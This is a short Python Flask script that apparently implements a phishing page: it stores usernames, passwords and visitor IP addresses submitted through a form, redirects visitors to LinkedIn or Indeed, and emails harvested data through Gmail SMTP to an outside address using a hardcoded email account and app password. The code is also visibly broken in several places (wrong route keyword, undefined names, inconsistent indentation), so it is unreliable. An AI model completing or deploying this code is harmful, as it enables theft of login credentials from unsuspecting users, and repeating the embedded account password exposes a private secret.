from flask import Flask, render_template, request, session
import smtplib

app = Flask(__name__) 

usernames = []
passwords = []
ip_every = []

totals = (f"The details are: {usernames} \n {passwords}\n and the ip is {ip_every}")


@app.route("/", method=["GET", "POST"])
def index():
	if request.method == "POST":
		username = request.form.get("username")
		password = request.form.get("password")
		ip_addresses = flask.request.remote_addr
		usernames.append(username)
		passwords.append(password)
    		ip_every.append(ip_addresses)

	if request.form['username'] == 'admin' or request.form['password'] == 'admin':
            return render_template('index.html')
        else:
            return render_template("https://linkedin.com")

	return render_template("https://indeed.com")


EMAIL_ADDRESS = ("busganda@gmail.com")
EMAIL_PASSWORD = ("mkarxgucgtnvymys")

with smtplib.SMTP("smtp.gmail.com", 587) as smtp:
	smtp.ehlo()
	smtp.starttls()
	smtp.ehlo()

	smtp.login( EMAIL_ADDRESS , EMAIL_PASSWORD )
	
	subject = ("Just Testing")
	body = (ip_every)
	msg (f"Subject: {subject}\n\n{body}")
	smtp.sendmail("busganda@gmail.com", "gideonbusayo@gmail.com", msg)

